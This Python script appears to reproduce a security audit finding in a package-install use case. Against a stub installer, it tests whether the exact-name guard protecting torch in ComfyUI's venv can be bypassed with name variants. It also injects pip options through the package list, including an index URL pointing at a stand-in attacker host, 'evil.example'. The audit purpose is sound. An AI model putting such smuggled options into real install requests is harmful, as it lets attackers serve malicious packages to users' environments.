"""N5-02: the server-side 'never install torch into ComfyUI's venv' check is an exact-name match on a client-supplied list."""
import os, sys, time
from pathlib import Path
sys.path.insert(0, os.environ.get("REPO","."))
from backend.application.ports.package_installer import InstallError, InstallRequest, PackageInstaller
from backend.application.use_cases.install_packages import StartInstall, GetInstall

class Recording(PackageInstaller):
    def __init__(self): self.requests=[]
    def install(self, request, on_line=None):
        self.requests.append(request)

def attempt(target, packages, constraints=()):
    inst = Recording(); jobs = {}
    start = StartInstall(installer=inst, project_root=Path("/tmp/x"), base_python="python3", jobs=jobs)
    try:
        start.execute(target=target, packages=tuple(packages), constraints=tuple(constraints), comfy_venv_python="/usr/bin/python3")
    except InstallError as e:
        return f"REFUSED  ({str(e)[:70]}...)"
    except Exception as e:
        return f"error {type(e).__name__}: {str(e)[:70]}"
    time.sleep(0.3)
    return "ACCEPTED -> pip would run: " + (" ".join(inst.requests[0].packages) if inst.requests else "(request not recorded)")

print("target=comfy (ComfyUI's own venv; torch must never be touched)")
for p in (["torch"], ["torch==2.5.0"], ["Torch"], ["torch[opt]"], ["torch>=1"], [" torch"], ["pytorch-triton-xpu"]):
    print(f"  packages={p!s:24s} {attempt('comfy', p)}")
print("option injection through the package list")
for target in ("comfy", "new"):
    for p in (["--index-url=http://evil.example/simple", "fastapi"], ["-r", "/tmp/anything.txt"]):
        print(f"  target={target:5s} packages={p!s:55s} {attempt(target, p)}")
